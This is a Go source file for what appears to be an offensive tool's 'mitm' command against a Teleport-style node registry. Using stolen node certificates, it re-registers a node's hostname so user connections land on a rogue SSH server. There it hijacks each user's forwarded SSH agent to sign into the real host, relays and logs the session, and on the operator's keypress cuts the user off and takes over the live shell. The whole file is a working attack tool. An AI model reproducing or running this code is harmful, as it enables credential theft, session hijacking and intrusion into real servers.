package cli

import (
	"bufio"
	"context"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"sync"
	"time"

	gssh "github.com/gliderlabs/ssh"
	"github.com/spf13/cobra"
	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/agent"
	"golang.org/x/term"
	api "xpnsec.com/node-hijack/v2/pkg/api"
	transport "xpnsec.com/node-hijack/v2/pkg/api/transport"
	sshserver "xpnsec.com/node-hijack/v2/pkg/ssh"
)

var clientCert string
var clientKey string
var nodeId string
var clientSSHCert string
var ctx context.Context
var cancel context.CancelFunc

func sleep(ctx context.Context, duration time.Duration) error {
	timer := time.NewTimer(duration)
	defer timer.Stop()

	select {
	case <-ctx.Done():
		return ctx.Err()
	case <-timer.C:
		return nil
	}
}

type switchWriter struct {
	mu sync.Mutex
	w  io.Writer
}

func (sw *switchWriter) Write(p []byte) (int, error) {
	sw.mu.Lock()
	w := sw.w
	sw.mu.Unlock()
	return w.Write(p)
}

func (sw *switchWriter) set(w io.Writer) {
	sw.mu.Lock()
	sw.w = w
	sw.mu.Unlock()
}

type tap struct {
	logw io.Writer
	dir  string
	dst  io.Writer
}

func (t *tap) Write(p []byte) (int, error) {
	//fmt.Fprintf(t.logw, "[%s %s] %s\n", time.Now().Format("15:04:05.000"), t.dir, string(p))
	fmt.Fprintf(t.logw, "%s", string(p))
	return t.dst.Write(p)
}

func shellRelay(s gssh.Session, client *ssh.Client, logw *switchWriter) error {
	out, err := client.NewSession()
	if err != nil {
		return err
	}
	defer out.Close()

	ptyReq, winCh, isPty := s.Pty()
	if isPty {
		if err := out.RequestPty(ptyReq.Term, ptyReq.Window.Height, ptyReq.Window.Width, ssh.TerminalModes{}); err != nil {
			return err
		}
		go func() {
			for win := range winCh {
				_ = out.WindowChange(win.Height, win.Width)
			}
		}()
	}

	outSwitch := &switchWriter{w: s}
	out.Stdout = &tap{logw: logw, dir: "OUT", dst: outSwitch}

	stdin, err := out.StdinPipe()
	if err != nil {
		return err
	}

	if err := out.Shell(); err != nil {
		return err
	}

	waitDone := make(chan error, 1)
	go func() { waitDone <- out.Wait() }()

	// Client input -> target. Plain forward, NO trigger. Client works normally.
	clientDone := make(chan struct{})
	go func() {
		defer close(clientDone)
		buf := make([]byte, 4096)
		for {
			n, rerr := s.Read(buf)
			if n > 0 {
				chunk := buf[:n]
				//fmt.Fprintf(logw, "[%s IN] %q\n", time.Now().Format("15:04:05.000"), chunk)
				stdin.Write(chunk)
			}
			if rerr != nil {
				return
			}
		}
	}()

	// OPERATOR trigger: Enter on the SERVER's own stdin (your console).
	takeover := make(chan struct{})
	go func() {
		r := bufio.NewReader(os.Stdin)
		for {
			b, err := r.ReadByte()
			if err != nil {
				return // no server terminal / EOF -> takeover simply disabled
			}
			if b == '\n' || b == '\r' {
				close(takeover)
				return
			}
		}
	}()

	select {
	case err := <-waitDone:
		return finishExit(s, err)

	case <-takeover:
		io.WriteString(s, `
█████ █████    ███████    █████  █████      █████████   ███████████   ██████████
░░███ ░░███   ███░░░░░███ ░░███  ░░███      ███░░░░░███ ░░███░░░░░███ ░░███░░░░░█
 ░░███ ███   ███     ░░███ ░███   ░███     ░███    ░███  ░███    ░███  ░███  █ ░
  ░░█████   ░███      ░███ ░███   ░███     ░███████████  ░██████████   ░██████
   ░░███    ░███      ░███ ░███   ░███     ░███░░░░░███  ░███░░░░░███  ░███░░█
    ░███    ░░███     ███  ░███   ░███     ░███    ░███  ░███    ░███  ░███ ░   █
    █████    ░░░███████░   ░░████████      █████   █████ █████   █████ ██████████
   ░░░░░       ░░░░░░░      ░░░░░░░░      ░░░░░   ░░░░░ ░░░░░   ░░░░░ ░░░░░░░░░░

   ███████████ ██████████ ███████████   ██████   ██████ █████ ██████   █████   █████████   ███████████ ██████████ ██████████
  ░█░░░███░░░█░░███░░░░░█░░███░░░░░███ ░░██████ ██████ ░░███ ░░██████ ░░███   ███░░░░░███ ░█░░░███░░░█░░███░░░░░█░░███░░░░███
  ░   ░███  ░  ░███  █ ░  ░███    ░███  ░███░█████░███  ░███  ░███░███ ░███  ░███    ░███ ░   ░███  ░  ░███  █ ░  ░███   ░░███
      ░███     ░██████    ░██████████   ░███░░███ ░███  ░███  ░███░░███░███  ░███████████     ░███     ░██████    ░███    ░███
      ░███     ░███░░█    ░███░░░░░███  ░███ ░░░  ░███  ░███  ░███ ░░██████  ░███░░░░░███     ░███     ░███░░█    ░███    ░███
      ░███     ░███ ░   █ ░███    ░███  ░███      ░███  ░███  ░███  ░░█████  ░███    ░███     ░███     ░███ ░   █ ░███    ███
      █████    ██████████ █████   █████ █████     █████ █████ █████  ░░█████ █████   █████    █████    ██████████ ██████████
     ░░░░░    ░░░░░░░░░░ ░░░░░   ░░░░░ ░░░░░     ░░░░░ ░░░░░ ░░░░░    ░░░░░ ░░░░░   ░░░░░    ░░░░░    ░░░░░░░░░░ ░░░░░░░░░░


     *** CONNECTION TERMINATED ***
`)

		// Redirect upstream output to our console BEFORE killing the client,
		// so the stdout copier never writes into a dead connection.
		outSwitch.set(os.Stdout)

		if logFile, ferr := os.OpenFile("session.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600); ferr == nil {
			logw.set(logFile)
		} else {
			logw.set(io.Discard)
		}

		s.Close()
		<-clientDone // client input goroutine has stopped touching `stdin`

		// Raw mode so our keystrokes pass through immediately, no local echo.
		if oldState, terr := term.MakeRaw(int(os.Stdin.Fd())); terr == nil {
			defer term.Restore(int(os.Stdin.Fd()), oldState)
		}
		// Optional: resize the remote PTY to OUR terminal, not the client's.
		if w, h, e := term.GetSize(int(os.Stdout.Fd())); e == nil {
			_ = out.WindowChange(h, w)
		}

		// THE MISSING PIECE: pump operator keystrokes into the upstream shell.
		go func() {
			_, _ = io.Copy(stdin, os.Stdin)
			_ = stdin.Close() // EOF to remote when your stdin closes
		}()

		_, _ = stdin.Write([]byte("\n")) // nudge a fresh prompt

		err := <-waitDone // block until the remote shell exits (`exit`/Ctrl-D)
		var ee *ssh.ExitError
		if errors.As(err, &ee) {
			return nil
		}
		return err
	}
}

func finishExit(s gssh.Session, err error) error {
	var ee *ssh.ExitError
	if errors.As(err, &ee) {
		s.Exit(ee.ExitStatus())
		return nil
	}
	if err != nil {
		return err
	}
	s.Exit(0)
	return nil
}

type LogWriter struct {
}

func (l LogWriter) Write(p []byte) (n int, err error) {
	fmt.Print(string(p))
	return len(p), nil
}

var MITMCmd = &cobra.Command{
	Use:   "mitm",
	Short: "MITM a node",
	Long:  ``,
	Run: func(cmd *cobra.Command, args []string) {
		client, err := api.NewClient(clientCert, clientKey, "10.1.10.1:8443")
		if err != nil {
			panic(err)
		}

		node, err := client.GetNode(ctx, nodeId)
		if err != nil {
			panic(err)
		}

		go func(ctx context.Context) {
			oldHostname := node.Spec.Hostname

			for {
				select {
				case <-ctx.Done():
					fmt.Println("[*] Cleaning up node...")
					err = client.DeleteNode(context.Background(), oldHostname)
					if err != nil {
						panic(err)
					}

					node.Spec.Hostname = oldHostname
					err = client.UpdateNode(context.Background(), node)
					if err != nil {
						panic(err)
					}
					return

				default:
					// We need to rename the old hostname so we can capture others connecting to it
					node.Spec.Hostname = fmt.Sprintf("%s-archived", oldHostname)
					client.UpdateNode(context.Background(), node)

					// Now we can create our new node which will receive connections
					err = client.UpsertNode(context.Background(), oldHostname)
					if err != nil {
						panic(err)
					}
					sleep(ctx, time.Second*20)
				}
			}
		}(ctx)

		go func(ctx context.Context) {
			server := sshserver.NewSSHServer("/tmp/hijack-certs/host_ssh_signed.crt", "/tmp/hijack-certs/host.key")
			fmt.Printf("[*] SSH Server Started on port 2223\n")
			err := server.Start(func(s gssh.Session) {

				if !gssh.AgentRequested(s) {
					fmt.Println("[!] No agent forwarded")
					return
				}

				l, err := gssh.NewAgentListener()
				if err != nil {
					log.Fatal(err)
				}
				defer l.Close()
				go gssh.ForwardAgentConnections(l, s)

				// Dial the local socket to get an agent client backed by the CLIENT's agent.
				conn, err := net.Dial("unix", l.Addr().String())
				if err != nil {
					io.WriteString(s, fmt.Sprintf("dial agent: %v\n", err))
					return
				}
				defer conn.Close()

				ag := agent.NewClient(conn)
				fmt.Printf("[*] Agent connected, listing keys\n")
				keys, err := ag.List()
				if err != nil {
					io.WriteString(s, fmt.Sprintf("list keys: %v\n", err))
					return
				}
				for _, key := range keys {
					fmt.Printf("[*] Key: %s\n", key.Type())
				}

				//target := "10.1.0.50:22"
				targetUser := "localuser"

				clientConf := &ssh.ClientConfig{
					User: targetUser,
					Auth: []ssh.AuthMethod{
						ssh.PublicKeysCallback(ag.Signers), // signing happens on origin agent
					},
					// Pivot tradecraft: pin this in a real op. Ignoring it is here for brevity.
					HostKeyCallback: ssh.InsecureIgnoreHostKey(),
				}

				client, err := transport.NewClient("10.1.10.1:8443")
				sshConnTunnel, err := client.CreateSSHConnection(ctx, "example.com", "teleport-node-2-archived:22")
				sshConn, chans, reqs, err := ssh.NewClientConn(sshConnTunnel, "", clientConf)
				if err != nil {
					io.WriteString(s, fmt.Sprintf("dial target: %v\n", err))
					return
				}

				tconn := ssh.NewClient(sshConn, chans, reqs)
				defer tconn.Close()
				logSwitch := &switchWriter{w: os.Stderr}
				shellRelay(s, tconn, logSwitch)
			})
			if err != nil {
				panic(err)
			}
		}(ctx)

		// fmt.Println("[*] Press Enter to clean up...")
		// fmt.Scanln()

		// cancel()

		// fmt.Println("[*] Cleaning up in 10 seconds...")
		time.Sleep(100 * time.Hour)
	},
}

func init() {
	ctx, cancel = context.WithCancel(context.Background())

	MITMCmd.Flags().StringVarP(&clientCert, "client-cert", "c", "", "Existing Node Cert")
	MITMCmd.Flags().StringVarP(&clientKey, "client-key", "k", "", "Existing Node Key")
	MITMCmd.Flags().StringVarP(&clientSSHCert, "client-ssh-cert", "s", "", "Existing SSH Cert")
	MITMCmd.Flags().StringVarP(&nodeId, "node-id", "n", "", "Node ID")
}
